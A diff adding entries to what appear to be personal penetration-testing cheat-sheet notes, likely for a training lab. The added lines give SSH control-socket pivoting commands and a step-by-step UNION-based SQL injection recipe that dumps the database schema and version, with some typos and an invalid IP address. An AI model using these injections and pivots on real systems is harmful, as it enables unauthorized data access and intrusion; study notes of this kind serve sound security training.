@@ -779,6 +779,10 @@ CONROL SOCKETS
   ssh -S /tmp/demo demo -O forward -D9050                                        -create a dynamic tunnel from the socket demo.
   ssh -S /tmp/demo demo -O forward -L1111:10.208.50.42:22 -L1112:10.208.50.422:80  - creating a local port forward
   ssh -S /tmp/demo demo -O cancel -L1112:10.20.50.422:80                           - to cancel a socket 
+
+NEXT HOP 
+  ssh -MS /tmp/t1 user@127.0.0.1 -p 1111
+  ssh -S /tmp/t1 t1 -O forward -L4209:<ip>:80
   
 NET RECON 
   cat /etc/hosts, /usr/share
@@ -815,8 +819,25 @@ SQL!!!
 go to inspect > networck > post > request > raw (radio button)   view page source to make it look better.   GET METHOD
 add a "?" and copy paste back into URL       -Example: x.x.x.x/login.php? <paste>
 
+SQL GET METHOD
+1. Find vulnerable field
+  HTTP://10.50.32.39/uniondemo.php?SELECTION=2 OR 1=1
+2. Identify # of columns 
+  http://10.50.32.39/uniondemo.php?Selection=2 UNION SELECT 1,2,3
+3. use golden statement 
+  http://127.0.0.1:1111/uniondemo.php?Selection=2 UNION SELECT table_schema,table_name,colum_name from information_schema.columns
 
+CRAFTING QUERIES
+UNION select <column>,<column>,<column> from <database>.<table>
 
+GET VERSION
+  UNION SELECT 1,2,@@VERSION
+
+FIND A FUNCTION
+  scp program over to linops > gdp <filename> > pdisass main
+
+windows open file explorer view hidden item 
+ empty comment -services.
 
 
 
